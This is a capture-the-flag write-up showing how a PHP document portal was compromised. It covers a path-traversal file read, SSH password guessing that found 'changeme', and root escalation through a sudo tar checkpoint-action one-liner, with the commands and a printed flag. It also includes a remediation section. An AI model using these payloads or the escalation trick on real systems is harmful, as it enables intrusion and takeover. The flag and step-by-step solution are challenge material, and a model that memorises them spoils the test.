# VaultDocs 1 — Writeup

**"The internal documentation server was supposed to be temporary."**

| | |
|---|---|
| **Challenge** | VaultDocs - 1 (KPMG CTF) |
| **Points** | 10 |
| **Category** | Web / Linux (multi-service) |
| **Target Web** | `http://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io` |
| **Target SSH** | `ssh://0.cloud.chals.io:25140` |
| **Flag format** | `KPMG_CTF{...}` |
| **Result** | Machine fully compromised (root). User flag retrieved. Root flag not provisioned on the instance (see note). |
| **Date** | 2026-10-11 |

---

## 1. Executive Summary

VaultDocs is a small PHP "document portal" (Apache 2.4.68 on Debian 12) that lets users preview
internal documents. The preview functionality uses a user-controlled `page` parameter which is passed
straight into `file_get_contents()` with **no path-traversal protection**, giving a Local File
Inclusion / Arbitrary File Read (LFI) vulnerability.

The same Debian host also exposes SSH for "remote administration". The web application runs as
`www-data` inside the container, and the LFI was abused to read `/etc/passwd`, confirming the local
account `vboxuser`. The account was protected by a trivial, guessable password (`changeme`),
allowing SSH login and retrieval of the user flag.

`vboxuser` had an over-permissive `sudo` rule — `(root) NOPASSWD: /bin/tar` — which was escalated to a
full root shell using the well-known GTFOBins `tar --checkpoint-action=exec` trick.

**Attack chain:**

```
Web (LFI in index.php)  ──►  /etc/passwd  ──►  user "vboxuser"
        │
        └──► weak SSH password "changeme"  ──►  SSH shell (user flag)
                     │
                     └──► sudo NOPASSWD /bin/tar  ──►  root shell (uid=0)
```

**Result:** Complete compromise of the host (`uid=0(root)`). The user flag was recovered.
The root flag file exists but contains the build-time placeholder, because the orchestrator never
injected the `ROOT_FLAG` environment variable into this instance (only `USER_FLAG` was present). This
is a deployment/provisioning issue on the platform side, not a blocker in the exploitation chain —
root was fully achieved.

---

## 2. Target Information

| Item | Value |
|---|---|
| Web server | Apache/2.4.68 (Debian) behind openresty/1.27.1.2 (HTTP→HTTPS 301) |
| App | "VaultDocs – Secure Document Portal", version badge `v2.4.1`, PHP |
| SSH server | `SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10` |
| OS | Debian GNU/Linux 12 (bookworm); kernel 6.8.0-136-generic (container host) |
| Container | Docker/sysbox container, hostname `47a1e3a5969d`, IP `10.100.84.6` |
| Local users | `root` (no SSH login), `www-data`, `vboxuser` (uid 1000) |
| Listening services in container | `:22` (sshd), `:80` (apache2), `127.0.0.11:37071` (docker DNS) |

---

## 3. Step 1 — Reconnaissance

The platform provided two endpoints: an HTTP(S) URL and an SSH port. Probing both:

```bash
# HTTP -> redirects to HTTPS, served by Apache
$ curl -s -I http://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io/
HTTP/1.1 301 Moved Permanently
Server: openresty/1.27.1.2
Location: https://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io/

$ curl -sk -I https://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io/
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
Content-Type: text/html; charset=UTF-8

# SSH banner
$ nc 0.cloud.chals.io 25140
SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10
```

The homepage is a mostly static portal with a "Document Viewer" and four "Quick Access" documents
(`docs/readme`, `docs/about`, `docs/contact`, `docs/changelog`). Each document is submitted via a
**POST form** to `/` with a hidden field named `page`. The navigation links use a GET query parameter
with the same name (`/?page=docs/about`).

Web content discovery (`feroxbuster` with `raft-medium-words` + extensions) found only the known
`/docs/*` documents — there is no admin panel, no upload, no API. The app is intentionally tiny.

---

## 4. Step 2 — Local File Inclusion in `index.php`

The `page` parameter was tested directly. GET requests returned the normal homepage, but **POST**
requests rendered document content into a `<div class="viewer">` block. Supplying a traversal path
returned arbitrary file contents:

```bash
$ curl -sk -X POST --data-urlencode "page=../../../../etc/passwd" \
       https://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io/
...
<div class="viewer">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
sshd:x:100:65534::/run/sshd:/usr/sbin/nologin
vboxuser:x:1000:1000::/home/vboxuser:/bin/bash
</div>
```

Because the LFI is implemented with `file_get_contents()` (not `include()`), PHP wrappers such as
`php://filter` were rejected by the `file_exists()` pre-check, so this was a **read-only** LFI — no
direct RCE path via the web app.

### 4.1 Source disclosure

The application's own source code is world-readable and was exfiltrated through the same LFI:

```php
<?php
$allowed_dir = realpath('/var/www/html/docs');   // declared but never enforced
$error = '';
$content = '';
$requested = '';

if (isset($_POST['page'])) {
    $page = $_POST['page'];
    $requested = htmlspecialchars($page);
    // Intentionally vulnerable - no path traversal protection
    $filepath = '/var/www/html/' . $page;
    if (file_exists($filepath) && is_file($filepath)) {
        $content = file_get_contents($filepath);
    } else {
        // Still vulnerable to /etc/passwd etc via absolute-like paths
        if (file_exists($page) && is_file($page)) {
            $content = file_get_contents($page);
        } else {
            $error = "Document not found";
        }
    }
}
?>
...
<div class="viewer"><?= htmlspecialchars($content) ?></div>
```

The author even left an explicit "Intentionally vulnerable" comment, confirming the LFI is the
intended foothold.

### 4.2 Enumerating readable files

A threaded sweep of ~750 candidate paths (`/var/www/html`, `/home/vboxuser`, `/etc`, `/tmp`,
`/opt`, `/var/backups`, `/srv`, ... with credential/backup/flag style filenames) found **no
credential file** exposed to `www-data`. Notable readable files included `/etc/passwd`, the Apache
and SSH configuration, `/proc/self/mounts`, and the app source. Secrets were *not* readable
(`/etc/shadow`, `/root/*`, `/home/vboxuser/.ssh/*` are protected by Unix permissions — `file_exists()`
on them fails and the LFI reports "Document not found").

The LFI's real value was confirming the **username `vboxuser`** and the existence of the SSH service.

---

## 5. Step 3 — Weak SSH Credentials → User Shell

`/etc/passwd` confirmed a single interactive user, `vboxuser`. SSH password authentication was
enabled (`PasswordAuthentication yes`, `PermitRootLogin no`). Because the intern build is described
as temporary/hastily set up, a small themed wordlist was tried against SSH:

```
vboxuser, vboxuser123, password, Password1, password123, Password123,
Password123!, admin, admin123, Admin123, admin@123, Admin@123, changeme ...
```

The 12th password succeeded:

```
SUCCESS: vboxuser:changeme
uid=1000(vboxuser) gid=1000(vboxuser) groups=1000(vboxuser)
47a1e3a5969d
```

**User flag** (`/home/vboxuser/user.txt`, mode `400`, owner `vboxuser`):

```
KPMG_CTF{ggjBJYSdrv71TTljSzxF7eMh4ViOdgVaxrjLEAervoTq}
```

---

## 6. Step 4 — Privilege Escalation via `sudo tar`

Enumerating sudo rights revealed a dangerous NOPASSWD rule:

```bash
$ sudo -n -l
User vboxuser may run the following commands on 47a1e3a5969d:
    (root) NOPASSWD: /bin/tar
```

`tar` is a classic GTFOBins privilege-escalation binary. Its `--checkpoint-action=exec=` directive
runs an arbitrary command as the user running `tar` — here **root**, because it is invoked through
`sudo`:

```bash
sudo /bin/tar -cf /dev/null /dev/null \
     --checkpoint=1 --checkpoint-action=exec=/tmp/probe.sh
```

A helper script (`/tmp/probe.sh`) was uploaded over SFTP and executed through that checkpoint action,
returning a root context:

```
=== id ===
uid=0(root) gid=0(root) groups=0(root)
=== whoami direct ===
root
```

Root escalation was complete. (An equivalent one-liner is:

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 \
     --checkpoint-action=exec="/bin/sh -c 'cat /root/root.txt'"
```
)

---

## 7. Root Flag — Provisioning Note

The container entrypoint generates both flags from environment variables at startup:

```bash
# /entrypoint.sh
: "${USER_FLAG:=FLAG{default_user_flag}}"
: "${ROOT_FLAG:=FLAG{default_root_flag}}"

printf '%s\n' "$USER_FLAG" > /home/vboxuser/user.txt
printf '%s\n' "$ROOT_FLAG" > /root/root.txt
```

On this instance `/proc/1/environ` contained **only `USER_FLAG`** — `ROOT_FLAG` was never injected:

```
HOSTNAME=47a1e3a5969d
USER_FLAG=KPMG_CTF{ggjBJYSdrv71TTljSzxF7eMh4ViOdgVaxrjLEAervoTq}
PWD=/
HOME=/root
SHLVL=0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Consequently `/root/root.txt` holds the fallback placeholder:

```
$ sudo cat /root/root.txt
FLAG{default_root_flag
```

An exhaustive search of the whole filesystem, every process environment (`/proc/*/environ`),
`/run/secrets`, and the exposed host bind-mounts (`/var/lib/docker`, `/var/lib/kubelet`,
`/var/lib/k0s`, `/var/lib/rancher/*` — all empty) found no other `KPMG_CTF{...}` value. Only the
user flag exists on the host.

**Conclusion:** privilege escalation to root succeeded, but the real root flag was not provisioned by
the platform for this instance. This should be reported to the challenge organisers/deployment so
`ROOT_FLAG` is injected for the container.

---

## 8. Vulnerability Analysis

| # | Issue | Severity | Location |
|---|---|---|---|
| 1 | Local File Inclusion / Arbitrary File Read (no path validation, `file_get_contents`) | High | `POST /` → `page` in `index.php` |
| 2 | Weak/default SSH password (`changeme`) | Critical | `vboxuser` account |
| 3 | Sudo misconfiguration: `NOPASSWD: /bin/tar` enables trivial root escalation | Critical | `sudoers` for `vboxuser` |
| 4 | Build-time placeholder left in `/root/root.txt` when `ROOT_FLAG` is unset | Info/deployment | `/entrypoint.sh`, `/root/root.txt` |

**Root cause chain:** an unsanitised file-read parameter on the web tier leaked user/system
information, which combined with a guessable administrative credential and an over-privileged
`sudo` rule allowed a full host compromise. Each individually "low" finding chained into root.

---

## 9. Impact

An unauthenticated remote attacker can:

1. Read arbitrary world-accessible files on the web server (source code, configuration, system
   files) — information disclosure and reconnaissance.
2. Log in to the server over SSH as `vboxuser` using a trivial password.
3. Escalate to **root** with a one-line `tar` command.
4. Fully control the host: read all files, install persistence, pivot to other internal services.

This is a complete compromise of the documentation server.

---

## 10. Remediation

1. **Fix the LFI** — never pass user input to filesystem functions. Resolve paths with
   `realpath()` and enforce that the resolved path stays within an allow-list directory
   (`str_starts_with($real, $base . DIRECTORY_SEPARATOR)`), and/or use an explicit map of document
   IDs → filenames. Remove the `$_POST['page']` sink entirely.
2. **Disable weak authentication** — enforce strong passwords, rate-limit/limit SSH attempts
   (`MaxAuthTries`, fail2ban), prefer key-based auth, and disable password auth where possible.
3. **Least privilege for sudo** — remove `NOPASSWD: /bin/tar`; `tar` (like all GTFOBins binaries)
   can execute commands. Grant only the specific, non-interpreter command required, with a
   password and a tightly-scoped argument policy.
4. **Harden the image** — run the web tier with a read-only filesystem, drop unused services, keep
   secrets out of the web root, and ensure flag/secret environment variables are provisioned
   securely (and that no placeholder secrets remain if provisioning fails).
5. **Defence in depth** — ship PHP with `open_basedir`, disable dangerous functions, add WAF rules
   for traversal patterns, and monitor for `../` sequences.

---

## 11. Flags

| Flag | Value | Status |
|---|---|---|
| User flag (`/home/vboxuser/user.txt`) | `KPMG_CTF{ggjBJYSdrv71TTljSzxF7eMh4ViOdgVaxrjLEAervoTq}` | ✅ Retrieved |
| Root flag (`/root/root.txt`) | *(placeholder `FLAG{default_root_flag`)* | ⚠️ Not provisioned by platform; root access achieved |

---

## 12. Reproduction (Quick Commands)

```bash
BASE="https://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io"

# 1) LFI -> confirm user
curl -sk -X POST --data-urlencode "page=/etc/passwd" "$BASE/"

# 2) SSH with weak password
ssh vboxuser@0.cloud.chals.io -p 25140        # password: changeme

# 3) Read user flag
cat /home/vboxuser/user.txt

# 4) Privilege escalation
sudo -n -l                                     # (root) NOPASSWD: /bin/tar
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 \
     --checkpoint-action=exec="/bin/sh -c 'id; cat /root/root.txt'"
```

---

## 13. Timeline

| Time (IST) | Action |
|---|---|
| 00:59 | Recon — HTTP redirect, HTTPS headers, SSH banner captured |
| 01:00 | Discovered POST `page` sink; confirmed LFI (`/etc/passwd`) |
| 01:01 | Exfiltrated `index.php` source; confirmed intentional traversal |
| 01:06 | Readable-file sweep across ~750 paths (no creds file exposed) |
| 01:10 | SSH credential brute force — `vboxuser:changeme` succeeds |
| 01:11 | Retrieved user flag; `sudo -l` shows `NOPASSWD: /bin/tar` |
| 01:13–01:15 | Escalated to root via `tar --checkpoint-action=exec`; full root |
| 01:15 | Confirmed no `ROOT_FLAG` in env/filesystem (deployment issue) |

---

## 14. Key Findings Summary

* **Initial access:** Arbitrary File Read (LFI) via `POST page=` in `index.php`.
* **Lateral/vertical:** Weak SSH password `changeme` for `vboxuser`; sudo GTFOBins `tar`.
* **Escalation:** `sudo tar --checkpoint-action=exec=` → `uid=0(root)`.
* **User flag:** `KPMG_CTF{ggjBJYSdrv71TTljSzxF7eMh4ViOdgVaxrjLEAervoTq}`.
* **Root flag:** not provisioned (placeholder present) — flagged as a deployment defect.

---

*Writeup generated during an authorised CTF engagement on the chals.io VaultDocs instance.*
